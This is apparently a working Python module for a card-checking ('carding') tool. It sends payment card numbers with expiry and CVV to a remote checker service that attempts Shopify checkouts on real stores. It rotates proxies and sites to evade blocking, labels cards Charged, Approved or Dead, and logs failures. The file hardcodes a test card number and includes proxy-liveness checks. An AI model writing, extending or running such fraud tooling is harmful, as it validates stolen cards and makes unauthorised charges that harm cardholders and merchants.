"""
check_engine.py — Card checking engine + proxy utilities
Uses the Shopify checkout API server via POST/JSON.
"""
import asyncio
import aiohttp
import random
import os
import httpx
import json

CHECKER_API = os.environ.get("CHECKER_API_URL", "https://web-production-a9462.up.railway.app/check")
_API_TIMEOUT = httpx.Timeout(connect=5.0, read=30.0, write=5.0, pool=10.0)

_http_client: httpx.AsyncClient | None = None
_client_lock = asyncio.Lock()

_session_bad_sites: set[str] = set()

def clear_session_bad_sites():
    global _session_bad_sites
    _session_bad_sites = set()

async def _get_client() -> httpx.AsyncClient:
    global _http_client
    async with _client_lock:
        if _http_client is None or _http_client.is_closed:
            _http_client = httpx.AsyncClient(
                timeout=_API_TIMEOUT,
                limits=httpx.Limits(
                    max_connections=500,
                    max_keepalive_connections=100,
                    keepalive_expiry=30.0,
                ),
            )
    return _http_client

def _make_result(card, status, message, price='-', gateway='Shopify Payments',
                 receipt_url='', retryable=False, proxy='', time=None):
    return {
        'status':      status,
        'message':     message,
        'card':        card,
        'gateway':     gateway,
        'price':       price,
        'receipt_url': receipt_url,
        'retry':       retryable,
        'proxy':       proxy,
        'time':        time,
    }

_PROXY_ERR_SIGNALS = (
    'connection timed out', 'connection timeout', 'timed out',
    'proxy', 'eof occurred', 'remote end closed', 'failed to perform',
)

def _is_proxy_err(msg: str) -> bool:
    return any(s in msg.lower() for s in _PROXY_ERR_SIGNALS)

async def _call_checker_api(shop_url: str, card: str, proxy_raw: str) -> dict:
    """
    POST to the checker API (JSON). Parses the response correctly.
    """
    c = await _get_client()
    payload = {
        "card":     card,
        "shop_url": shop_url,
        "proxy":    proxy_raw,
        "low":      True
    }
    try:
        r = await c.post(f"{CHECKER_API}/check", json=payload)
        r.raise_for_status()
        data = r.json()
    except Exception as e:
        # Network or HTTP error – treat as retryable
        return _make_result(
            card, 'Dead',
            message=f"API error: {str(e)[:100]}",
            retryable=True,
        )

    # --- Parse API response ---
    # The API returns fields: "Response", "error", "Price", "Gate", "Charged", "retryable"
    status = data.get("Response", "ERROR").upper()
    error_msg = data.get("error", "")
    price = data.get("Price", "-")
    gateway = data.get("Gate", "Shopify")
    receipt_url = data.get("receipt_url", "")
    retryable = data.get("retryable", False)

    if status == "CHARGED":
        return _make_result(
            card, 'Charged',
            message="Payment captured",
            price=price,
            gateway=gateway,
            receipt_url=receipt_url,
            proxy=proxy_raw,
        )
    elif status == "APPROVED":
        return _make_result(
            card, 'Approved',
            message="Approved (possible 3DS or insufficient funds)",
            price=price,
            gateway=gateway,
            proxy=proxy_raw,
        )
    elif status == "DECLINED":
        return _make_result(
            card, 'Dead',
            message=error_msg or "Declined",
            gateway=gateway,
            retryable=retryable,
            proxy=proxy_raw,
        )
    else:
        # ERROR or unknown
        return _make_result(
            card, 'Dead',
            message=error_msg or "Checker error",
            gateway=gateway,
            retryable=retryable,
            proxy=proxy_raw,
        )

async def test_site(site: str, proxy: str) -> dict:
    test_card = "5154623245618097|03|2032|156"
    try:
        result = await _call_checker_api(site, test_card, proxy)
        if result['status'] in ('Charged', 'Approved', 'Dead'):
            return {'site': site, 'status': 'alive'}
        return {'site': site, 'status': 'dead', 'msg': result.get('message', '')[:100]}
    except Exception as e:
        return {'site': site, 'status': 'dead', 'msg': str(e)[:80]}

async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy=None):
    """
    Check a card against the local checker API.
    Retries on proxy/site errors — stops on a definitive card result.
    """
    if not sites:
        return _make_result(card, 'Dead', 'No sites configured')
    if not proxies:
        return _make_result(card, 'Dead', 'No proxy configured')

    last_err = 'Unknown error'
    MAX_TRIES = 8
    failed_sites = set()

    for attempt in range(MAX_TRIES):
        available = [s for s in sites if s not in failed_sites] or list(sites)
        shop_url = random.choice(available)
        proxy_raw = (start_proxy if attempt == 0 and start_proxy else random.choice(proxies))

        try:
            result = await _call_checker_api(shop_url, card, proxy_raw)
        except Exception as e:
            last_err = str(e)
            failed_sites.add(shop_url)
            await asyncio.sleep(0.5)
            continue

        # Terminal results
        if result['status'] in ('Charged', 'Approved'):
            result['proxy'] = proxy_raw
            return result

        if result['status'] == 'Dead' and not result.get('retry'):
            return result

        # Retryable
        last_err = result.get('message', 'Retryable error')
        if _is_proxy_err(last_err):
            await asyncio.sleep(0.5)
            continue
        if 'step 0' in last_err.lower() or 'no product' in last_err.lower():
            failed_sites.add(shop_url)
        await asyncio.sleep(0.2)

    _log_error_card(card, last_err)
    return _make_result(card, 'Dead', last_err)

def clear_error_log():
    try:
        open("error.txt", 'w').close()
    except Exception:
        pass

def _log_error_card(card: str, reason: str):
    try:
        with open("error.txt", 'a', encoding='utf-8') as f:
            f.write(f"{card}  # {reason[:100]}\n")
    except Exception:
        pass

def _proxy_to_url(proxy: str) -> str:
    p = proxy.strip()
    if p.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return p
    parts = p.split(':')
    if len(parts) == 2:
        return f'http://{p}'
    if len(parts) >= 4:
        host, port = parts[0], parts[1]
        rest = ':'.join(parts[2:])
        mid = rest.rfind(':')
        user_part = rest[:mid]
        pw_part = rest[mid+1:]
        return f'http://{user_part}:{pw_part}@{host}:{port}'
    return f'http://{p}'

async def test_proxy(proxy: str) -> dict:
    proxy_url = _proxy_to_url(proxy)
    test_urls = [
        'http://httpbin.org/ip',
        'http://api.ipify.org',
        'http://icanhazip.com',
    ]
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=conn) as s:
            for url in test_urls:
                try:
                    async with s.get(url, proxy=proxy_url, allow_redirects=True) as r:
                        if r.status == 200:
                            return {'proxy': proxy, 'status': 'alive'}
                except Exception:
                    continue
        return {'proxy': proxy, 'status': 'dead'}
    except Exception:
        return {'proxy': proxy, 'status': 'dead'}

async def get_proxy_ip(proxy: str) -> str | None:
    proxy_url = _proxy_to_url(proxy)
    if proxy_url.startswith('socks'):
        return None
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get('https://api.ipify.org', proxy=proxy_url) as r:
                if r.status == 200:
                    return (await r.text()).strip()
    except Exception:
        pass
    return None
